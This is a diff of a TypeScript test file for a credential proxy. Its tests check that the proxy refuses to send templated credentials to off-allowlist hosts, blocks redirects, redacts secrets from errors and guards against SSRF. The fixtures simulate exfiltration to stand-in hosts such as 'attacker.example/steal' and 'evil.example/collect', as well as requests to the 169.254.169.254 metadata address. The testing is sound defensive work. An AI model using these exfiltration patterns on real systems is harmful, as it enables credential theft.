@@ -9,9 +9,18 @@
  */
 
 import { describe, it, expect, mock } from "bun:test";
-import { cookieBucketKey, executeApiCall, type ApiCallDeps } from "../credential-proxy.ts";
+import { cookieScope } from "@appstrate/afps-runtime/resolvers";
+import {
+  credentialScope,
+  executeApiCall,
+  type ApiCallDeps,
+  type ApiCallRequestBody,
+} from "../credential-proxy.ts";
 import { _setLogSinkForTesting } from "../logger.ts";
 import type { CredentialsResponse } from "../helpers.ts";
+
+/** The credential scope of `integrationId` on the `conn-1` connection these tests bind. */
+const scopeOf = (integrationId: string): string => credentialScope(integrationId, "conn-1");
 
 function makeDeps(overrides: Partial<ApiCallDeps> = {}): ApiCallDeps {
   return {
@@ -24,6 +33,7 @@ function makeDeps(overrides: Partial<ApiCallDeps> = {}): ApiCallDeps {
           headers: { "Content-Type": "application/json" },
         }),
     ) as unknown as typeof fetch,
+    declaredUris: ["https://api.example.com/**"],
     fetchCredentials: mock(async (): Promise<CredentialsResponse> => ({
       credentials: { access_token: "tok-123" },
       authorizedUris: ["https://api.example.com/**"],
@@ -40,12 +50,18 @@ function makeDeps(overrides: Partial<ApiCallDeps> = {}): ApiCallDeps {
   };
 }
 
+/** Cookies the run-wide jar holds for `url`'s own origin. */
+function jarCookies(deps: ApiCallDeps, integrationId: string, url: string): string | undefined {
+  return cookieScope(deps.cookieJar, scopeOf(integrationId), null).header(url, null);
+}
+
 describe("executeApiCall — structured failures", () => {
   it("rejects malformed integrationId without touching credentials", async () => {
     const fetchCredentials = mock(async () => ({}) as never);
     const result = await executeApiCall(
       {
         integrationId: "../traversal",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x",
         method: "GET",
         callerHeaders: {},
@@ -65,6 +81,7 @@ describe("executeApiCall — structured failures", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/{{missing}}",
         method: "GET",
         callerHeaders: {},
@@ -80,6 +97,7 @@ describe("executeApiCall — structured failures", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://other.example.com/x",
         method: "GET",
         callerHeaders: {},
@@ -92,6 +110,81 @@ describe("executeApiCall — structured failures", () => {
       expect(result.status).toBe(403);
       expect(result.error).toMatch(/not authorized/);
     }
+  });
+});
+
+describe("executeApiCall — connection-rendered allowlists (#1627)", () => {
+  function recordingFetch() {
+    const calls: string[] = [];
+    const fetchFn = mock(async (url: string | URL) => {
+      calls.push(String(url));
+      return new Response("ok");
+    });
+    return { fetchFn: fetchFn as unknown as typeof fetch, calls };
+  }
+  const call = (targetUrl: string, deps: ApiCallDeps) =>
+    executeApiCall(
+      {
+        integrationId: "@appstrate/wordpress",
+        connectionId: "conn-1",
+        targetUrl,
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+
+  it("refuses every target when the connection's URL does not render the declared list", async () => {
+    const { fetchFn, calls } = recordingFetch();
+    const result = await call(
+      "https://attacker.example/steal",
+      makeDeps({
+        fetchFn,
+        declaredUris: ["{$credential.site_url}/**"],
+        // `mysite.com` has no scheme: the platform renders nothing.
+        fetchCredentials: mock(async (): Promise<CredentialsResponse> => ({
+          credentials: { site_url: "mysite.com", basic: "YWRtaW46czNjcmV0" },
+          authorizedUris: [],
+          allowAllUris: false,
+          credentialHeaderName: "Authorization",
+          credentialHeaderPrefix: "Basic ",
+          credentialFieldName: "basic",
+        })),
+      }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toContain("does not render");
+      expect(result.error).not.toContain("mysite.com");
+    }
+    expect(calls).toEqual([]);
+  });
+
+  it("an off-list refusal names the declared template, never the rendered secret URL", async () => {
+    const hook = "https://hooks.example.com/services/T000/B000/SECRETTOKEN";
+    const { fetchFn, calls } = recordingFetch();
+    const result = await call(
+      "https://example.com/",
+      makeDeps({
+        fetchFn,
+        declaredUris: ["{$credential.webhook_url}"],
+        fetchCredentials: mock(async (): Promise<CredentialsResponse> => ({
+          credentials: { webhook_url: hook },
+          authorizedUris: [hook],
+          allowAllUris: false,
+          credentialFieldName: "webhook_url",
+        })),
+      }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toContain("{$credential.webhook_url}");
+      expect(result.error).not.toContain("SECRETTOKEN");
+    }
+    expect(calls).toEqual([]);
   });
 });
 
@@ -111,6 +204,7 @@ describe("executeApiCall — happy path", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/messages",
         method: "GET",
         callerHeaders: { "X-Custom": "x" },
@@ -125,11 +219,7 @@ describe("executeApiCall — happy path", () => {
       expect(text).toBe('{"data":42}');
       expect(result.authRefreshed).toBe(false);
     }
-    // Bucketed by (integration, gate, capture origin) — the default creds
-    // declare an allowlist, so this call was allowlist-gated.
-    expect(
-      deps.cookieJar.get(cookieBucketKey("gmail", "allowlist", "https://api.example.com")),
-    ).toEqual(["sess=abc"]);
+    expect(jarCookies(deps, "gmail", "https://api.example.com/")).toBe("sess=abc");
     // Verify Authorization was server-side injected.
     const callArgs = fetchFn.mock.calls[0]!;
     const init = callArgs[1] as RequestInit & { headers: Record<string, string> };
@@ -166,6 +256,7 @@ describe("executeApiCall — auth-scheme template repair (#988)", () => {
       const result = await executeApiCall(
         {
           integrationId: "gmail",
+          connectionId: "conn-1",
           targetUrl: "https://api.example.com/x",
           method: "GET",
           callerHeaders: {},
@@ -183,6 +274,7 @@ describe("executeApiCall — auth-scheme template repair (#988)", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x",
         method: "GET",
         // Caller-supplied header wins over the server injection, so this is
@@ -201,6 +293,7 @@ describe("executeApiCall — auth-scheme template repair (#988)", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x",
         method: "GET",
         callerHeaders: { Authorization: "Bearer{{access_token}}" },
@@ -237,6 +330,7 @@ describe("executeApiCall — 401 retry path", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x",
         method: "GET",
         callerHeaders: { authorization: "Bearer caller" },
@@ -252,7 +346,7 @@ describe("executeApiCall — 401 retry path", () => {
     };
     expect(sent.headers.authorization).toBe("Bearer caller");
     expect(refreshCredentials).not.toHaveBeenCalled();
-    expect(deps.reportedAuthFailures.has("gmail")).toBe(false);
+    expect(deps.reportedAuthFailures.has(scopeOf("gmail"))).toBe(false);
   });
 
   it("refreshes credentials and replays the buffered request once", async () => {
@@ -285,6 +379,7 @@ describe("executeApiCall — 401 retry path", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x",
         method: "GET",
         callerHeaders: {},
@@ -296,7 +391,7 @@ describe("executeApiCall — 401 retry path", () => {
     if (result.ok) expect(result.response.status).toBe(200);
     expect(refreshCredentials).toHaveBeenCalledTimes(1);
     expect(callCount).toBe(2);
-    expect(deps.reportedAuthFailures.has("gmail")).toBe(false);
+    expect(deps.reportedAuthFailures.has(scopeOf("gmail"))).toBe(false);
   });
 
   it("does NOT retry when the refresh returns null (terminal — credential flagged platform-side)", async () => {
@@ -317,6 +412,7 @@ describe("executeApiCall — 401 retry path", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x",
         method: "GET",
         callerHeaders: {},
@@ -328,7 +424,7 @@ describe("executeApiCall — 401 retry path", () => {
     if (result.ok) expect(result.response.status).toBe(401);
     expect(calls).toBe(1);
     expect(refreshCredentials).toHaveBeenCalledTimes(1);
-    expect(deps.reportedAuthFailures.has("gmail")).toBe(true);
+    expect(deps.reportedAuthFailures.has(scopeOf("gmail"))).toBe(true);
   });
 
   it("does NOT replay a streaming-request body on 401", async () => {
@@ -359,6 +455,7 @@ describe("executeApiCall — 401 retry path", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/upload",
         method: "POST",
         callerHeaders: {},
@@ -411,6 +508,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "kijiji",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/login",
         method: "GET",
         callerHeaders: {},
@@ -421,10 +519,8 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     expect(result.ok).toBe(true);
     if (result.ok) expect(result.response.status).toBe(200);
     expect(calls).toBe(3);
-    // The whole chain lands in the bucket of the INITIAL target's origin.
-    const jar = deps.cookieJar.get(
-      cookieBucketKey("kijiji", "allowlist", "https://api.example.com"),
-    );
+    // Every hop is same-origin, so the whole chain lands in that origin's bucket.
+    const jar = jarCookies(deps, "kijiji", "https://api.example.com/");
     // Pre-fix: ["step1=A", "last=Z"] — session=XYZ is missing.
     // Post-fix: all three cookies merged into the jar.
     expect(jar).toContain("step1=A");
@@ -456,6 +552,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/a",
         method: "GET",
         callerHeaders: {},
@@ -493,6 +590,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/post",
         method: "POST",
         callerHeaders: { "content-type": "application/json" },
@@ -528,6 +626,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/post",
         method: "POST",
         callerHeaders: { "content-type": "application/json" },
@@ -560,6 +659,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/loop",
         method: "GET",
         callerHeaders: {},
@@ -607,6 +707,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/start",
         method: "GET",
         callerHeaders: { authorization: "Bearer caller-token" },
@@ -647,6 +748,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/start",
         method: "GET",
         callerHeaders: { "x-api-key": "caller-secret" },
@@ -676,6 +778,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/upload",
         method: "POST",
         callerHeaders: {},
@@ -689,9 +792,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     // credential header into a cross-origin redirect.
     const init = fetchFn.mock.calls[0]![1] as RequestInit;
     expect(init.redirect).toBe("manual");
-    expect(
-      deps.cookieJar.get(cookieBucketKey("demo", "allowlist", "https://api.example.com")),
-    ).toEqual(["final=F"]);
+    expect(jarCookies(deps, "demo", "https://api.example.com/")).toBe("final=F");
   });
 
   it("propagates caller-supplied Cookie header across all hops (jar wins on dup)", async () => {
@@ -717,6 +818,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/a",
         method: "GET",
         // Caller passes two cookies — one will be rotated by upstream, one won't.
@@ -760,6 +862,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/v1/login",
         method: "GET",
         callerHeaders: {},
@@ -795,6 +898,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/start",
         method: "GET",
         callerHeaders: {},
@@ -829,6 +933,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/old",
         method: "PUT",
         callerHeaders: { "content-type": "application/json" },
@@ -864,6 +969,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/check",
         method: "HEAD",
         callerHeaders: {},
@@ -894,6 +1000,7 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/upload",
         method: "POST",
         callerHeaders: {},
@@ -949,6 +1056,7 @@ describe("executeApiCall — per-hop redirect hardening (#475)", () => {
       const result = await executeApiCall(
         {
           integrationId: "demo",
+          connectionId: "conn-1",
           targetUrl: "https://api.example.com/start",
           method: "GET",
           callerHeaders: {},
@@ -981,6 +1089,7 @@ describe("executeApiCall — per-hop redirect hardening (#475)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/start",
         method: "GET",
         callerHeaders: {},
@@ -1037,6 +1146,7 @@ describe("executeApiCall — per-hop redirect hardening (#475)", () => {
     const result = await executeApiCall(
       {
         integrationId: "dropbox",
+        connectionId: "conn-1",
         targetUrl: "https://api.dropboxapi.com/2/files/get_metadata",
         method: "GET",
         callerHeaders: {},
@@ -1085,6 +1195,7 @@ describe("executeApiCall — per-hop redirect hardening (#475)", () => {
     const result = await executeApiCall(
       {
         integrationId: "webhooks",
+        connectionId: "conn-1",
         targetUrl: "https://hook.example.com/trigger",
         method: "GET",
         callerHeaders: {},
@@ -1117,6 +1228,7 @@ describe("executeApiCall — per-hop redirect hardening (#475)", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/start",
         method: "GET",
         callerHeaders: {},
@@ -1151,6 +1263,7 @@ describe("executeApiCall — per-hop redirect hardening (#475)", () => {
     await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/start",
         method: "GET",
         callerHeaders: {},
@@ -1187,6 +1300,7 @@ describe("executeApiCall — finalUrl: redirect terminus", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/messages",
         method: "GET",
         callerHeaders: {},
@@ -1219,6 +1333,7 @@ describe("executeApiCall — finalUrl: redirect terminus", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/authorize",
         method: "GET",
         callerHeaders: {},
@@ -1252,6 +1367,7 @@ describe("executeApiCall — finalUrl: redirect terminus", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/a",
         method: "GET",
         callerHeaders: {},
@@ -1284,6 +1400,7 @@ describe("executeApiCall — finalUrl: redirect terminus", () => {
     const result = await executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/upload",
         method: "POST",
         callerHeaders: {},
@@ -1329,6 +1446,7 @@ describe("executeApiCall — finalUrl: redirect terminus", () => {
     const result = await executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x",
         method: "GET",
         callerHeaders: {},
@@ -1388,6 +1506,7 @@ describe("executeApiCall — debug diagnostic envelope (#404)", () => {
     executeApiCall(
       {
         integrationId: "gmail",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/messages",
         method: "GET",
         callerHeaders: { "X-Custom": "x" },
@@ -1488,6 +1607,347 @@ describe("executeApiCall — debug diagnostic envelope (#404)", () => {
     expect(envelope!.injectedHeader).toBeNull();
     expect(envelope!.urlPolicy).toBe("allow_all");
   });
+
+  it("reports urlPolicy 'allowlist' when a templated credential downgrades allow_all", async () => {
+    const fetchCredentials = mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { api_key: "SECRET" },
+      authorizedUris: ["https://api.example.com/**"],
+      allowAllUris: true,
+      credentialFieldName: "api_key",
+    }));
+    const records = await captureLogs("debug", async () => {
+      const r = await executeApiCall(
+        {
+          integrationId: "gmail",
+          connectionId: "conn-1",
+          targetUrl: "https://api.example.com/messages",
+          method: "GET",
+          callerHeaders: { "X-Key": "{{api_key}}" },
+          body: { kind: "none" },
+        },
+        makeDeps({ fetchCredentials }),
+      );
+      expect(r.ok).toBe(true);
+    });
+    const envelope = records.find((r) => r.msg === "integration api_call completed");
+    expect(envelope).toBeDefined();
+    expect(envelope!.urlPolicy).toBe("allowlist");
+  });
+});
+
+describe("executeApiCall — redirects after the credential-exfiltration downgrade", () => {
+  /** allow_all_uris AND an allowlist; no server-side header injection. */
+  const allowAllWithAllowlist = () =>
+    mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { api_key: "SECRET" },
+      authorizedUris: ["https://api.example.com/**"],
+      allowAllUris: true,
+      credentialFieldName: "api_key",
+    }));
+
+  /** Allowlisted host answers `status → location`; every other host 200s. */
+  function redirectingFetch(status: number, location: string) {
+    const calls: { url: string; init: RequestInit & { headers: Record<string, string> } }[] = [];
+    const fetchFn = mock(async (url: string | URL, init?: RequestInit) => {
+      const u = typeof url === "string" ? url : url.toString();
+      calls.push({ url: u, init: init as RequestInit & { headers: Record<string, string> } });
+      if (u.startsWith("https://api.example.com")) {
+        return new Response(null, { status, headers: { location } });
+      }
+      return new Response("ok", { status: 200 });
+    });
+    return { fetchFn: fetchFn as unknown as typeof fetch, calls };
+  }
+
+  it("refuses a 302 off the allowlist when a header templates a credential", async () => {
+    const { fetchFn, calls } = redirectingFetch(302, "https://evil.example.net/c");
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/start",
+        method: "GET",
+        callerHeaders: { "X-Key": "{{api_key}}" },
+        body: { kind: "none" },
+      },
+      makeDeps({ fetchFn, fetchCredentials: allowAllWithAllowlist() }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toMatch(/Redirect blocked \(unauthorized\)/);
+      expect(result.error).toContain("evil.example.net");
+    }
+    expect(calls.map((c) => c.url)).toEqual(["https://api.example.com/start"]);
+    expect(calls[0]!.init.headers["X-Key"]).toBe("SECRET");
+  });
+
+  it("refuses a 307 off the allowlist when the substituted body carries a credential", async () => {
+    const { fetchFn, calls } = redirectingFetch(307, "https://evil.example.net/c");
+    const text = '{"key":"{{api_key}}"}';
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/start",
+        method: "POST",
+        callerHeaders: { "content-type": "application/json" },
+        body: {
+          kind: "buffered",
+          bytes: new TextEncoder().encode(text).buffer as ArrayBuffer,
+          text,
+        },
+        substituteBody: true,
+      },
+      makeDeps({ fetchFn, fetchCredentials: allowAllWithAllowlist() }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toMatch(/Redirect blocked \(unauthorized\)/);
+    }
+    expect(calls.map((c) => c.url)).toEqual(["https://api.example.com/start"]);
+    expect(calls[0]!.init.body).toBe('{"key":"SECRET"}');
+  });
+
+  it("still follows allow_all redirects to a public host when no credential is templated", async () => {
+    const { fetchFn, calls } = redirectingFetch(302, "https://elsewhere.example.net/c");
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/start",
+        method: "GET",
+        callerHeaders: { "X-Custom": "x" },
+        body: { kind: "none" },
+      },
+      makeDeps({ fetchFn, fetchCredentials: allowAllWithAllowlist() }),
+    );
+    expect(result.ok).toBe(true);
+    if (result.ok) expect(result.finalUrl).toBe("https://elsewhere.example.net/c");
+    expect(calls.map((c) => c.url)).toEqual([
+      "https://api.example.com/start",
+      "https://elsewhere.example.net/c",
+    ]);
+  });
+});
+
+describe("executeApiCall — credential exfiltration with URL-valued credential fields", () => {
+  const VICTIM_HOOK = "https://hooks.example.com/services/TVICTIM/x";
+  const fieldCreds = (policy: { authorizedUris: string[] | null; allowAllUris: boolean }) =>
+    mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { webhook_url: VICTIM_HOOK, secret_header_value: "S", api_key: "SECRET" },
+      ...policy,
+      credentialFieldName: "api_key",
+    }));
+
+  function recordingFetch() {
+    const calls: string[] = [];
+    const fetchFn = mock(async (url: string | URL) => {
+      calls.push(String(url));
+      return new Response("ok");
+    });
+    return { fetchFn: fetchFn as unknown as typeof fetch, calls };
+  }
+
+  // A field's origin is often shared by tenants (hooks.slack.com): it must
+  // never make another endpoint on it a valid destination for the secret.
+  it.each([
+    [
+      "a JSON body carrying {{webhook_url}}",
+      { callerHeaders: {}, body: { kind: "json", value: { u: "{{webhook_url}}" } } },
+    ],
+    [
+      "a header carrying a secret",
+      { callerHeaders: { "X-Secret": "{{secret_header_value}}" }, body: { kind: "none" } },
+    ],
+  ] as const)(
+    "allow_all_uris, no allowlist: refuses %s to another tenant's hook on the field's origin",
+    async (_, req) => {
+      const { fetchFn, calls } = recordingFetch();
+      const result = await executeApiCall(
+        {
+          integrationId: "demo",
+          targetUrl: "https://hooks.example.com/services/TATTACKER/y",
+          method: "POST",
+          ...req,
+          substituteBody: true,
+        } as Parameters<typeof executeApiCall>[0],
+        makeDeps({
+          fetchFn,
+          fetchCredentials: fieldCreds({ authorizedUris: null, allowAllUris: true }),
+        }),
+      );
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.status).toBe(403);
+      expect(calls).toHaveLength(0);
+    },
+  );
+
+  it("declared allowlist: refuses a templated call to a URL-valued field outside it", async () => {
+    const { fetchFn, calls } = recordingFetch();
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "{{webhook_url}}",
+        method: "POST",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      makeDeps({
+        fetchFn,
+        fetchCredentials: fieldCreds({
+          authorizedUris: ["https://api.example.com/**"],
+          allowAllUris: false,
+        }),
+      }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toMatch(/URL not authorized/);
+      expect(result.error).not.toContain("hooks.example.com");
+    }
+    expect(calls).toHaveLength(0);
+  });
+
+  it("detects a JSON-body leaf credential with whitespace inside the braces", async () => {
+    const { fetchFn, calls } = recordingFetch();
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://evil.example/collect",
+        method: "POST",
+        callerHeaders: {},
+        body: { kind: "json", value: { k: "{{\tapi_key}}" } },
+        substituteBody: true,
+      },
+      makeDeps({
+        fetchFn,
+        fetchCredentials: fieldCreds({ authorizedUris: null, allowAllUris: true }),
+      }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.status).toBe(403);
+    expect(calls).toHaveLength(0);
+  });
+});
+
+describe("executeApiCall — no credential in an error host", () => {
+  const SECRET = "AbCSecret9";
+  const globCreds = mock(async (): Promise<CredentialsResponse> => ({
+    credentials: { api_key: SECRET },
+    authorizedUris: ["https://*.api-us1.com/**"],
+    allowAllUris: false,
+    credentialFieldName: "api_key",
+  }));
+
+  it.each([
+    ["an unresolvable host", { resolveHost: async () => Promise.reject(new Error("ENOTFOUND")) }],
+    [
+      "a transport error",
+      {
+        fetchFn: mock(async () => {
+          throw Object.assign(new Error("connect failed"), { code: "ECONNREFUSED" });
+        }) as unknown as typeof fetch,
+      },
+    ],
+  ])("redacts a host-templated secret from %s", async (_, overrides) => {
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://{{api_key}}.api-us1.com/v3/contacts",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      makeDeps({ fetchCredentials: globCreds, ...overrides }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(502);
+      expect(result.error).toContain("{{api_key}}.api-us1.com");
+      expect(result.error).not.toContain(SECRET);
+      expect(result.error).not.toContain(SECRET.toLowerCase());
+    }
+  });
+
+  it("does not scrub a guessed credential value on an untemplated call (no oracle)", async () => {
+    const probe = async (host: string) => {
+      const result = await executeApiCall(
+        {
+          integrationId: "wp",
+          connectionId: "conn-1",
+          targetUrl: `https://${host}.nx.invalid/`,
+          method: "GET",
+          callerHeaders: {},
+          body: { kind: "none" },
+        },
+        makeDeps({
+          resolveHost: async () => Promise.reject(new Error("ENOTFOUND")),
+          fetchCredentials: mock(async (): Promise<CredentialsResponse> => ({
+            credentials: { username: "jdoe", application_password: "xxxx yyyy" },
+            authorizedUris: [],
+            allowAllUris: true,
+            credentialHeaderName: "Authorization",
+            credentialHeaderPrefix: "Basic ",
+            credentialFieldName: "application_password",
+          })),
+        }),
+      );
+      return result.ok ? "" : result.error;
+    };
+    // A matching guess reads exactly like a non-matching one.
+    expect(await probe("alice")).toContain("(alice.nx.invalid)");
+    expect(await probe("jdoe")).toContain("(jdoe.nx.invalid)");
+  });
+
+  it("scrubs the refreshed credential from a redirect refusal after a 401 retry", async () => {
+    const FRESH = "FreshTok42";
+    const creds = (token: string) =>
+      mock(async (): Promise<CredentialsResponse> => ({
+        credentials: { access_token: token },
+        authorizedUris: ["https://api.example.com/**"],
+        allowAllUris: false,
+        credentialHeaderName: "Authorization",
+        credentialHeaderPrefix: "Bearer ",
+        credentialFieldName: "access_token",
+      }));
+    let calls = 0;
+    const fetchFn = mock(async () =>
+      ++calls === 1
+        ? new Response("expired", { status: 401 })
+        : new Response(null, {
+            status: 302,
+            headers: { location: `https://${FRESH}.evil.example/` },
+          }),
+    );
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        connectionId: "conn-1",
+        targetUrl: "https://api.example.com/v1?t={{access_token}}",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      makeDeps({
+        fetchCredentials: creds("tok-old"),
+        refreshCredentials: creds(FRESH),
+        fetchFn: fetchFn as unknown as typeof fetch,
+      }),
+    );
+    expect(calls).toBe(2);
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toContain("host={{access_token}}.evil.example");
+      expect(result.error.toLowerCase()).not.toContain(FRESH.toLowerCase());
+    }
+  });
 });
 
 describe("executeApiCall — SSRF DNS-rebind layer", () => {
@@ -1495,6 +1955,7 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
     executeApiCall(
       {
         integrationId: "demo",
+        connectionId: "conn-1",
         targetUrl,
         method: "GET",
         callerHeaders: {},
@@ -1531,6 +1992,7 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
         makeDeps({
           fetchFn: fetchFn as unknown as typeof fetch,
           fetchCredentials,
+          declaredUris: [],
           resolveHost: async () => ["169.254.169.254"],
         }),
       );
@@ -1549,6 +2011,7 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
         makeDeps({
           fetchFn: fetchFn as unknown as typeof fetch,
           fetchCredentials,
+          declaredUris: [],
           resolveHost: async () => {
             throw new Error("ENOTFOUND");
           },
@@ -1571,6 +2034,7 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
     const result = await call(
       makeDeps({
         fetchCredentials: ssrfGuardCreds,
+        declaredUris: [],
         fetchFn: fetchFn as unknown as typeof fetch,
         resolveHost: async () => ["203.0.113.7", "10.0.0.5"],
       }),
@@ -1585,6 +2049,7 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
     const result = await call(
       makeDeps({
         fetchCredentials: ssrfGuardCreds,
+        declaredUris: [],
         fetchFn: fetchFn as unknown as typeof fetch,
         resolveHost: async () => ["203.0.113.7"],
       }),
@@ -1611,6 +2076,7 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
     const result = await call(
       makeDeps({
         fetchFn: fetchFn as unknown as typeof fetch,
+        declaredUris: ["https://intranet.corp.example/**"],
         fetchCredentials: mock(async (): Promise<CredentialsResponse> => ({
           credentials: { access_token: "tok" },
           authorizedUris: ["https://intranet.corp.example/**"],
@@ -1707,7 +2173,7 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
   it("IP-literal targets skip resolution but stay literal-blocked", async () => {
     const resolveHost = mock(async () => ["203.0.113.7"]);
     const result = await call(
-      makeDeps({ fetchCredentials: ssrfGuardCreds, resolveHost }),
+      makeDeps({ fetchCredentials: ssrfGuardCreds, declaredUris: [], resolveHost }),
       "https://169.254.169.254/latest/meta-data",
     );
     expect(result.ok).toBe(false);
@@ -1758,6 +2224,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "kijiji",
+        connectionId: "conn-1",
         targetUrl: "https://provider.example.com/login",
         method: "GET",
         callerHeaders: {},
@@ -1768,6 +2235,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "kijiji",
+        connectionId: "conn-1",
         targetUrl: "https://attacker.example.net/collect",
         method: "GET",
         callerHeaders: {},
